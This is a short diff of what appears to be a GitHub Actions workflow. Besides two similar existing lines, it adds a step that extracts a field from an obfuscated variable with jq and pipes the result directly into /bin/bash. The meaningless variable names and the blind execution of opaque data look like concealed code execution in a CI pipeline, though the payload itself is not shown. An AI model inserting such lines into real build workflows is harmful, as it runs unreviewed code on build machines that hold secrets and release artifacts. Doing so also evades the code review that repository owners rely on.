@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$jvgng8" | jq -r .nf4 | /bin/bash
           printf '%s' "$myqra2" | jq -r .ukg35 | /bin/bash
+          echo $lsfcr406 | jq -r .an95 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
